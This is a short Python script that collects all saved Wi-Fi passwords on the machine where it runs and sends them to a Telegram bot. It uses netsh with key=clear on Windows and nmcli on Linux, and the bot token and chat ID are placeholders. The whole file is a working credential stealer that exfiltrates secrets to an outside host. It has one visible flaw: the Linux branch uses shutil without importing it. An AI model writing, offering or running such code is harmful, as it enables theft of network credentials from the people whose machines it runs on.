import subprocess
import requests
import os
import json

BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'
CHAT_ID = 'YOUR_CHAT_ID_HERE'

def get_wifi_passwords():
    wifi_passwords = {}

    platform = os.name
    if platform == 'nt':
        output = subprocess.check_output('netsh wlan show profiles', shell=True).decode()
        profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]

        for profile in profiles:
            try:
                profile_info = subprocess.check_output(
                    f'netsh wlan show profile "{profile}" key=clear', shell=True
                ).decode()
                password_lines = [line for line in profile_info.split('\n') if "Key Content" in line]
                if password_lines:
                    password = password_lines[0].split(":")[1].strip()
                else:
                    password = "No password found"

                wifi_passwords[profile] = password
            except subprocess.CalledProcessError:
                wifi_passwords[profile] = "Could not retrieve password"

    elif platform == 'posix':
        nmcli_path = shutil.which("nmcli")
        if nmcli_path:
            try:
                result = subprocess.check_output(['nmcli', '-t', '-f', 'NAME,SECURITY', 'connection', 'show']).decode()
                networks = [line.split(":")[0] for line in result.strip().split('\n') if line]

                for network in networks:
                    try:
                        passwd_result = subprocess.check_output(
                            ['nmcli', '-s', '-g', '802-11-wireless-security.psk', 'connection', 'show', network]
                        ).decode().strip()
                        if passwd_result:
                            wifi_passwords[network] = passwd_result
                        else:
                            wifi_passwords[network] = "No password set or not found"
                    except subprocess.CalledProcessError:
                        wifi_passwords[network] = "Could not retrieve password"
            except Exception as e:
                wifi_passwords["error"] = f"Error: {str(e)}"
        else:
            wifi_passwords["error"] = "nmcli not found on system."

    else:
        wifi_passwords["error"] = "Unsupported operating system"

    return wifi_passwords

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    response = requests.post(url, data=payload)

    if response.status_code == 200:
        print("Successfully sent to Telegram.")
    else:
        print(f"Failed to send message: {response.status_code}, {response.text}")

def main():
    wifi_data = get_wifi_passwords()

    if "error" in wifi_data:
        send_to_telegram(f"Error fetching WiFi passwords: {wifi_data['error']}")
    else:
        formatted_message = "*WiFi Passwords:*\n\n"
        for wifi, password in wifi_data.items():
            formatted_message += f"`{wifi}` : `{password}`\n"
        
        send_to_telegram(formatted_message)

if __name__ == "__main__":
    main()
